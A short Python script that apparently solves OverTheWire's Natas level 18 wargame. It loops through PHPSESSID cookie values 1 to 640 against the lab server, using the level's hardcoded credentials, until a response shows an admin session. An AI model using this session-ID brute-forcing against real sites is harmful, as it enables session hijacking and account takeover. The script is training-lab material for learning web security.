import requests
from requests.auth import HTTPBasicAuth
import string
import time

url = 'http://natas18.natas.labs.overthewire.org'
auth = HTTPBasicAuth("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")

with requests.Session() as sesh:
	for i in range(1, 640+1):
		cookies = { "PHPSESSID": str(i) }
		params = { "debug": True, "username": "test", "password": "test" }
		res = sesh.post(url, auth=auth, params=params, cookies=cookies)
		
		cond = "You are an admin" in res.text
		print(i, cond)
		if cond: print(res.text)
